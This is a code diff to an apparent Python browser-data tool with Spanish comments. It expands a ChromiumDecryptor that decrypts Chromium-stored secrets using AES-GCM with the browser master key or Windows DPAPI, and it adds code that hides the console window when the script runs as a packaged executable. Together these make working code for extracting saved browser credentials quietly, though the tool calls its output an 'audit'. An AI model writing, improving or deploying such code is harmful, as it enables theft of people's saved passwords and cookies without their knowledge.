@@ -39,9 +39,15 @@ def safe_b64_decode(val):
         return val
 
 try:
-    win32crypt = importlib.import_module('win32crypt')
+    import win32crypt
 except ImportError:
     win32crypt = None
+
+# Ocultar consola inmediatamente si es un ejecutable (frozen)
+if getattr(sys, 'frozen', False):
+    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+    if hwnd:
+        ctypes.windll.user32.ShowWindow(hwnd, 0)
 
 from Cryptodome.Cipher import AES
 
@@ -227,14 +233,44 @@ class ChromiumDecryptor:
             return None
 
     def decrypt(self, blob, key):
-        # 3 (prefijo v10) + 12 (nonce) + 1 (payload) + 16 (tag GCM) = 32 bytes mínimo
-        if not isinstance(blob, (bytes, bytearray)) or len(blob) < 32:
-            return "[Blob inválido]"
+        """Descifra datos de Chromium con diagnóstico mejorado."""
+        if not blob:
+            return ""
+        # Asegurar que el blob sea bytes
+        if not isinstance(blob, (bytes, bytearray)):
+            try:
+                blob = bytes(blob)
+            except Exception:
+                return "[Error: Formato de datos inválido]"
+
+        if len(blob) < 3:
+            return "[Error: Dato muy corto]"
+
         try:
-            cipher = AES.new(key, AES.MODE_GCM, blob[3:15])
-            return cipher.decrypt(blob[15:-16]).decode()
-        except Exception:
-            return "[Error al descifrar]"
+            # Caso 1: AES-GCM (v10/v11)
+            if blob[:3] in (b'v10', b'v11'):
+                if not key:
+                    return "[Error: No se obtuvo Master Key]"
+                if len(blob) < 32:
+                    return "[Error: Blob AES truncado]"
+                
+                nonce  = blob[3:15]
+                payload = blob[15:-16]
+                cipher = AES.new(key, AES.MODE_GCM, nonce)
+                decrypted = cipher.decrypt(payload)
+                return decrypted.decode('utf-8', errors='replace')
+
+            # Caso 2: Legacy DPAPI
+            if win32crypt:
+                decrypted = win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1]
+                return decrypted.decode('utf-8', errors='replace')
+            
+            return "[Error: Falta pywin32 para Legacy]"
+
+        except Exception as e:
+            err_type = type(e).__name__
+            logger.debug(f"Falla en descifrado ({err_type}): {e}")
+            return f"[Error: {err_type}]"
 
     def audit(self, fmt="html", out="audit_report"):
         data    = []
